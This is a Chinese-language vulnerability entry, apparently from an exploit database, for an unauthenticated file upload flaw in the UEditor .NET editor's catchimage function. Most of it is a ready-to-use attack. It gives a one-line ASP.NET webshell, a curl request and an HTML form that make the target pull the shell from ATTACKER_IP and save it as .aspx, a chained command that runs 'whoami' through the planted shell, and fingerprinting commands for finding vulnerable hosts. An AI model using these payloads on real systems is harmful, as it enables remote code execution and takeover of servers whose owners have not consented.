---
id: UEDITOR-NET-UPLOAD
title: UEditor .NET 版 catchimage 远程文件上传漏洞
product: ueditor
vendor: Baidu
version_affected: "UEditor .NET 版 1.4.3 - 1.4.3.3"
severity: CRITICAL
tags: [file_upload, ssrf, 无需认证, 国产]
fingerprint: ["ueditor", "UEditor", "neditor"]
---

## 漏洞描述

百度 UEditor 编辑器 .NET 版本的 catchimage（远程抓图）功能存在文件上传漏洞。攻击者通过构造形如 `http://attacker/1.gif?.aspx` 的 URL，利用服务端对文件扩展名检查的缺陷，使服务端抓取远程文件后以 `.aspx` 扩展名保存到服务器，从而上传 webshell 实现远程代码执行。

## 影响版本

- UEditor .NET 版 1.4.3
- UEditor .NET 版 1.4.3.1
- UEditor .NET 版 1.4.3.2
- UEditor .NET 版 1.4.3.3

## 前置条件

- 无需认证
- 目标使用 UEditor .NET 版本
- catchimage 功能可用（`controller.ashx?action=catchimage`）
- 攻击者需要一台可被目标服务器访问的 HTTP 服务器

## 利用步骤

1. 在攻击机上放置 webshell 文件（命名为 `shell.gif`）
2. 启动 HTTP 服务器提供该文件
3. 向目标 UEditor catchimage 接口发送请求，source 参数使用 `.gif?.aspx` 格式绕过扩展名检查
4. 服务端抓取文件后以 `.aspx` 扩展名保存，获取返回的文件路径
5. 访问上传的 webshell

## Payload

**准备 webshell 文件**

```bash
# 在攻击机上创建 ASP.NET webshell
echo '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(Request["cmd"]);%>' > shell.gif
# 启动 HTTP 服务
python3 -m http.server 8080
```

**发送远程抓图请求**

```bash
curl -s "http://target/ueditor/net/controller.ashx?action=catchimage" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "source[]=http://ATTACKER_IP:8080/shell.gif?.aspx"
```

响应示例：
```json
{"state":"SUCCESS","list":[{"state":"SUCCESS","source":"http://ATTACKER_IP:8080/shell.gif?.aspx","url":"/ueditor/net/upload/image/20210101/xxxx.aspx"}]}
```

**HTML 表单提交方式**

```html
<form action="http://target/ueditor/net/controller.ashx?action=catchimage" enctype="application/x-www-form-urlencoded" method="POST">
  <input type="text" name="source[]" value="http://ATTACKER_IP:8080/shell.gif?.aspx" />
  <input type="submit" value="Submit" />
</form>
```

## 验证方法

```bash
# 从 catchimage 响应中提取上传路径
UPLOAD_PATH=$(curl -s "http://target/ueditor/net/controller.ashx?action=catchimage" \
  -d "source[]=http://ATTACKER_IP:8080/shell.gif?.aspx" | python3 -c "import sys,json;print(json.load(sys.stdin)['list'][0]['url'])")

# 访问 webshell
curl -s "http://target${UPLOAD_PATH}?cmd=whoami"
```

## 指纹确认

```bash
# UEditor 端点检测
curl -s "http://target/ueditor/net/controller.ashx?action=config" | grep -i "imageUrl"
curl -s "http://target/ueditor/" -o /dev/null -w "%{http_code}"

# 检查 catchimage 是否可用
curl -s "http://target/ueditor/net/controller.ashx?action=catchimage" -o /dev/null -w "%{http_code}"
```

## 参考链接

- https://github.com/fex-team/ueditor/issues/3814
- https://www.cnblogs.com/backlion/p/14067126.html
